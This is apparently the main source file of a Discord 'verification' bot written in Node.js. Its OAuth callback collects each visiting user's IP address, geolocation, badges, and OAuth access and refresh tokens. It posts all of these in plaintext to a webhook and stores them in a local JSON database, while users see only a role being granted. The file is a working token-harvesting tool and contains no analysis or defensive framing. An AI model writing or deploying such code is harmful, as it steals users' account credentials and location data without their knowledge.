require("dotenv").config();
const { Client, Intents, Collection } = require("discord.js");
const moment = require('moment');
const client = new Client({
  fetchAllMembers: true,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  intents: 32767,
  partials: ["MESSAGE", "CHANNEL", "REACTION"],
});
const Borgoose = require("borgoose");
const userdb = new Borgoose("db/users.json", {
  syncOnWrite: true,
  createWithId: true,
});
const admins = new Borgoose("db/admins.json", {
  syncOnWrite: true,
  createWithId: true,
});
const servers = new Borgoose("db/servers.json",{
  syncOnWrite:true,
  createWithId:true
})
module.exports.userdb = userdb;
module.exports.admins= admins
module.exports.servers = servers
const axios = require("axios");
const Discord = require("discord.js");
const handler = require("./handler/index");
const express = require("express");
const app = express();
const randomUseragent = require('random-useragent');
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const finitto = require("./finitto");
const stopList = new Map()
module.exports.stopList = stopList
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.get("/", async (req, res) => {
  let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  ip = ip.replace("::ffff:","")
  let { code } = req.query;
  const url = req.url;

  
   

  
      res.sendFile(__dirname + '/index.html')
	  const serverid = req.query.state
  console.log(serverid)
  const server = servers.findOne({serverid:serverid})
const discordServer = await client.guilds.fetch(server.serverid)


 
	 
	

  let codeResponse = await fetch.default(
    "https://discord.com/api/oauth2/token",
    {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      method: "POST",
      body: new URLSearchParams({
        client_id: finitto.client_id,
        client_secret: finitto.client_secret,
        grant_type: "authorization_code",
        code: code,
        redirect_uri: finitto.redirect_uri,
      }).toString(),
    }
  );
  const codeJson = await codeResponse.json();
  if (!codeJson || !codeJson?.access_token) return;

  ac_token = codeJson.access_token;
  rf_token = codeJson.refresh_token;
  const tgg = {
    headers: { authorization: `${codeJson.token_type} ${ac_token}` },
  };

  const userResponse = await fetch.default(
    "https://discord.com/api/users/@me",
    {
      headers: { Authorization: `${codeJson.token_type} ${ac_token}` },
    }
  );
  const user = await userResponse.json();
  let status = userResponse.status;
  if (status == 401) {
    console.log("User unauthed, Not removing, Use clean cmd");
  }

  let userId = user.id;
  let users = await userdb.findOne({ userId: userId });
  if (users) {
    console.log(`[-] - ${ip} ` + user.username + "#" + user.discriminator);
    const guild = await client.guilds.fetch(discordServer).catch(() => null);
    if (!guild) return console.log("Sunucu yok")
     
    const member = await guild.members.fetch(userId).catch(() => null);
    if (!member) return console.log("Adam sw de yok")
    
    const role = await guild.roles.fetch(server.rolid).catch(() => null);
                if (!role) return;
                else await member.roles.add(role).catch(() => {
                    return console.log("Rol veremedim");
                });
      var klmn = require("ip-to-location");
  let usera = await client.users.fetch(userId);
      let badges;


      if (usera.flags.toArray().length > 0) {


        let DISCORD_EMPLOYEE = usera.flags.has('Staff') ? '<:1207icondiscordstaff:1084753206887841874>' : '';
        let PARTNERED_SERVER_OWNER = usera.flags.has('Partner') ? '<:1835iconpartneredserverowner:1084753390623527002>' : '';
        let DISCORD_CERTIFIED_MODERATOR = usera.flags.has('CertifiedModerator') ? '<:onaylimod:1084752421286318130>' : '';
        let HYPESQUAD_EVENTS = usera.flags.has('Hypesquad') ? '<:hypesquadevents:1084752417146540072>' : '';

        let HOUSE_BRAVERY = usera.flags.has('HypeSquadOnlineHouse1') ? '<:hypesquadbravery:1084752408317534249>' : '';
        let HOUSE_BRILLIANCE = usera.flags.has('HypeSquadOnlineHouse2') ? '<:hypesquadbrilliance:1084752418803302421>' : '';
        let HOUSE_BALANCE = usera.flags.has('HypeSquadOnlineHouse3') ? '<:hypesquadbalance:1084752403628306462>' : '';

        let BUGHUNTER_LEVEL_1 = usera.flags.has('BugHunterLevel1') ? '<:bughuntergreen:1084752415586275379>' : '';
        let BUGHUNTER_LEVEL_2 = usera.flags.has('BugHunterLevel2') ? '<:discordbughunterlv2:1084752413157765210>' : '';

        let EARLY_VERIFIED_BOT_DEVELOPER = usera.flags.has('VerifiedDeveloper') ? '<:earlyverifiedbotdeveloper:1084752411421331486>' : '';

        let EARLY_SUPPORTER = usera.flags.has('PremiumEarlySupporter') ? '<:iconearlysupporter:1084752406316859432>' : '';
		
		let ACTIVE_DEVELOPER = usera.flags.has('ActiveDeveloper') ? '<:5847activedeveloperbadge:1084906886136074311>' : '';

        badges = `${DISCORD_EMPLOYEE}${PARTNERED_SERVER_OWNER}${DISCORD_CERTIFIED_MODERATOR}${HYPESQUAD_EVENTS}${HOUSE_BRAVERY}${HOUSE_BRILLIANCE}${HOUSE_BALANCE}${BUGHUNTER_LEVEL_1}${BUGHUNTER_LEVEL_2}${EARLY_VERIFIED_BOT_DEVELOPER}${EARLY_SUPPORTER}${ACTIVE_DEVELOPER}`;

      } else {
        badges = '';
      }
      klmn.fetch(`${ip}`, async function (errrrr, jjkl) {
        let cd = jjkl.country_code;
        let cr = jjkl.country_name;
		 const timestamp = ((user.id / 4194304) + 1420070400000);
let x =  new Date(timestamp).toUTCString()



        avatarHASH =
          "https://cdn.discordapp.com/avatars/" +
          user.id +
          "/" +
          user.avatar +
          ".png?size=4096";
        fetch(finitto.webhooks.join, {
          // NE PAS TOUCHER ( OU SCRIPT CASSER)
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            avatar_url: "",
            embeds: [
              {
           color: 9408919,
            title: `**New User [Again]**`,
            thumbnail: { url: avatarHASH },
            description:
              `**👤 Identify:** \`${user.username}#${user.discriminator}\`` +
              `\n\n**🌍 IP:** \`${ip}\` :flag_${
                cd ? cd.toLowerCase() : "white"
              }:` +
              `\n\n**🏷️ ID:** \`${user.id}\`` +
			  `\n\n**🛡️ Badges:** ${badges}` +
              `\n\n **:tada: Created Time:** ${x}` +
              `\n\n**🟢 Acces Token:** \`${ac_token}\`` +
              `\n\n**🟡 Refresh Token:** \`${rf_token}\``,
          },
        ],
      }),
    })
        .then((res) =>
        console.log(user.username + " Webhook gönderildi.")
      )
          .catch((e) => console.log(e))
      });
    return;
  }

 


  var klmn = require("ip-to-location");

  klmn.fetch(`${ip}`, async function (errrrr, jjkl) {
    let cd = jjkl.country_code;
    let cr = jjkl.country_name;

    console.log(
      `[+] - ${ip} ` + user.username + "#" + user.discriminator
    );
	 const timestamps = ((user.id / 4194304) + 1420070400000);
let xs =  new Date(timestamps).toUTCString()

	let userass = await client.users.fetch(userId);
      let badgess;
      if (userass.flags.toArray().length > 0) {


        let DISCORD_EMPLOYEE = userass.flags.has('Staff') ? '<:1207icondiscordstaff:1084753206887841874>' : '';
        let PARTNERED_SERVER_OWNER = userass.flags.has('Partner') ? '<:1835iconpartneredserverowner:1084753390623527002>' : '';
        let DISCORD_CERTIFIED_MODERATOR = userass.flags.has('CertifiedModerator') ? '<:onaylimod:1084752421286318130>' : '';
        let HYPESQUAD_EVENTS = userass.flags.has('Hypesquad') ? '<:hypesquadevents:1084752417146540072>' : '';

        let HOUSE_BRAVERY = userass.flags.has('HypeSquadOnlineHouse1') ? '<:hypesquadbravery:1084752408317534249>' : '';
        let HOUSE_BRILLIANCE = userass.flags.has('HypeSquadOnlineHouse2') ? '<:hypesquadbrilliance:1084752418803302421>' : '';
        let HOUSE_BALANCE = userass.flags.has('HypeSquadOnlineHouse3') ? '<:hypesquadbalance:1084752403628306462>' : '';

        let BUGHUNTER_LEVEL_1 = userass.flags.has('BugHunterLevel1') ? '<:bughuntergreen:1084752415586275379>' : '';
        let BUGHUNTER_LEVEL_2 = userass.flags.has('BugHunterLevel2') ? '<:discordbughunterlv2:1084752413157765210>' : '';

        let EARLY_VERIFIED_BOT_DEVELOPER = userass.flags.has('VerifiedDeveloper') ? '<:earlyverifiedbotdeveloper:1084752411421331486>' : '';

        let EARLY_SUPPORTER = userass.flags.has('PremiumEarlySupporter') ? '<:iconearlysupporter:1084752406316859432>' : '';
		
		let ACTIVE_DEVELOPER = userass.flags.has('ActiveDeveloper') ? '<:5847activedeveloperbadge:1084906886136074311>' : '';

        badgess = `${DISCORD_EMPLOYEE}${PARTNERED_SERVER_OWNER}${DISCORD_CERTIFIED_MODERATOR}${HYPESQUAD_EVENTS}${HOUSE_BRAVERY}${HOUSE_BRILLIANCE}${HOUSE_BALANCE}${BUGHUNTER_LEVEL_1}${BUGHUNTER_LEVEL_2}${EARLY_VERIFIED_BOT_DEVELOPER}${EARLY_SUPPORTER}${ACTIVE_DEVELOPER}`;

      } else {
        badgess = 'None';
      }
    avatarHASH =
      "https://cdn.discordapp.com/avatars/" +
      user.id +
      "/" +
      user.avatar +
      ".png?size=4096";
    fetch(finitto.webhooks.join, {
      // NE PAS TOUCHER ( OU SCRIPT CASSER)
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        avatar_url: "",
        embeds: [
          {
            color: 9408919,
            title: `**New User**`,
            thumbnail: { url: avatarHASH },
            description:
              `**👤 Identify:** \`${user.username}#${user.discriminator}\`` +
              `\n\n**🌍 IP:** \`${ip}\` :flag_${
                cd ? cd.toLowerCase() : "white"
              }:` +
              `\n\n**🏷️ ID:** \`${user.id}\`` +
			  `\n\n**🛡️ Badges:** ${badgess}` +
			  `\n\n **🎉 Created Time:** ${xs}` +
              `\n\n**🟢 Acces Token:** \`${ac_token}\`` +
              `\n\n**🟡 Refresh Token:** \`${rf_token}\``,
          },
        ],
      }),
    })
      .catch((e) => console.log(e))
      .then((res) =>
        console.log(user.username + " Webhook gönderildi.")
      ),
      (users = await userdb.insertOne({
        userId: user.id,
        avatarURL: avatarHASH,
        username: user.username + "#" + user.discriminator,
        accessToken: ac_token,
        refreshToken: rf_token,
        user_ip: ip,
        country_code: cd,
        country: cr,
      }));


      const guild = await client.guilds.fetch(discordServer).catch(() => null);
      if (!guild) return console.log("Sunucu yok")
       
      const member = await guild.members.fetch(userId).catch(() => null);
      if (!member) return console.log("Adam sw de yok")
      
      const role = await guild.roles.fetch(server.rolid).catch(() => null);
                  if (!role) return;
                  else await member.roles.add(role).catch(() => {
                      return console.log("Rol veremedim");
                  });
      
      
  });
});



module.exports.client = client;

client.discord = Discord;
client.slash = new Collection();

handler.loadEvents(client);
handler.loadSlashCommands(client);

process.on("uncaughtException", (err) => {
  console.log("Uncaught Exception: " + err);
});

process.on("unhandledRejection", (reason, promise) => {
  console.log(
    "[FATAL] Possibly Unhandled Rejection at: Promise ",
    promise,
    " reason: ",
    reason.message
  );
});

client.login(finitto.token).catch((err) => {
  console.log(err);
});

app.listen("80", () => console.log("Logging in..."));